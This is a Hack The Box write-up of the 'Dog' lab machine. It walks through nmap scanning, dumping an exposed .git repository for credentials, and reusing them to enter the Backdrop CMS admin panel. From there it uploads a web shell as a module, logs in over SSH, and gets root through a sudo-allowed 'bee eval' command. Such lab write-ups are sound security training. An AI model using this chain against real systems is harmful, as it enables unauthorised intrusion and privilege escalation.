---
clayout: ctf
title: Dog
date: 2025-05-13
image: /ctf/hack-the-box/machines/dog/info-card.png
type: Hack The Box

ctf:
    - name: Dog
      link: https://app.hackthebox.com/machines/651
      thumbnail: /ctf/hack-the-box/machines/dog/info-card.png
      pwned:
        - link: https://labs.hackthebox.com/achievement/machine/585215/651  
          thumbnail: /ctf/hack-the-box/machines/dog/pwned.png
---

# Enumeration and Initial Access

## Network scanning

An initial Nmap scan was conducted to identify open ports and running services:

```bash
nmap -sV -sC -oN nmap/initial.nmap 10.10.10.10
```

Scan Results:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 972ad22c898ad3ed4dac00d21e8749a7 (RSA)
|   256 277c3ceb0f26e962590f0fb138c9ae2b (ECDSA)
|_  256 9388474c69af7216094cba771e3b3beb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin
| /comment/reply /filter/tips /node/add /search /user/register
```

**Observations:**

- SSH (22/tcp) is running OpenSSH 8.2p1.
- A web server (Apache 2.4.41) is running on port 80 with a robots.txt file disallowing access to several sensitive directories.

## Web enumeration

Navigating to the target IP address (10.10.11.58) reveals a Backdrop CMS-powered website.

![Dog - Backdrop CMS](/ctf/hack-the-box/machines/dog/backdrop-cms.png)

### Directory Bruteforcing – Dirsearch

A directory brute-force was performed using Dirsearch:

```bash
dirsearch -u http://10.10.11.58/ -o dirsearch/initial.txt
```

![Dog - dirsearch](/ctf/hack-the-box/machines/dog/dirsearch.png)

### Git Repository Disclosure

The presence of a `.git` directory was discovered, and its contents were extracted using [git-dumper](https://github.com/arthaud/git-dumper):

```bash
git-dumper http://10.10.11.58/.git ./git-dump/
```

Upon reviewing the extracted repository, a sensitive configuration file `settings.php` was located. It contained database connection credentials:

```php
$database = 'mysql://root:BackDrop...@127.0.0.1/backdrop';
```

Additionally, a user-related email address was identified:

```bash
grep -r "@dog.htb"
# ...
files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

### CMS Admin Panel Access

Using the credentials `tiffany:BackDropJ2024DS2024`, access was gained to the Backdrop CMS admin panel.

![Dog - Backdrop CMS admin](/ctf/hack-the-box/machines/dog/backdrop-cms-admin.png)

### Exploitation of Backdrop CMS

Backdrop CMS version 1.21.0 was identified, for which a known exploit exists ([Exploit-DB #52021]((https://www.exploit-db.com/exploits/52021))).

![Dog - Backdrop CMS exploit](/ctf/hack-the-box/machines/dog/backdrop-exploit.png)

A web shell was packaged into a `.tar` archive and uploaded via the module installer at: `http://10.10.11.58/?q=admin/installer/manual`.

![Dog - Backdrop CMS upload](/ctf/hack-the-box/machines/dog/backdrop-upload.png)

Once uploaded, the shell was accessible at: `http://10.10.11.58/modules/shell/shell.php`.

![Dog - Backdrop CMS shell](/ctf/hack-the-box/machines/dog/backdrop-shell.png)

### Gaining Shell Access

Reviewing `/etc/passwd` revealed the presence of multiple users, including `johncusack`.

![Dog - Backdrop CMS etc passwd](/ctf/hack-the-box/machines/dog/backdrop-etc-passwd.png)

Reusing the earlier credentials, SSH access was gained:

```bash
ssh johncusack@10.10.11.58
Password: BackDrop...

johncusack@dog:~$ id
uid=1001(johncusack) gid=1001(johncusack) groups=1001(johncusack)
```

The user flag was retrieved from `/home/johncusack/user.txt`.

# Privilege Escalation

Running `sudo -l` revealed that the `johncusack` user could execute `/usr/local/bin/bee` with elevated privileges:

```bash
User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

## Abuse of bee Utility

[Bee](https://github.com/backdrop-contrib/bee) is a command-line tool for Backdrop CMS administration. According to the documentation, it supports an `eval` function capable of executing arbitrary PHP code.

![Dog - Bee eval](/ctf/hack-the-box/machines/dog/bee-eval.png)

To escalate privileges, the `eval` option was used to run a system command as root:

```bash
johncusack@dog:/var/www/html$ sudo /usr/local/bin/bee ev "system('id')"
uid=0(root) gid=0(root) groups=0(root)
```

The root flag was retrieved from `/root/root.txt`
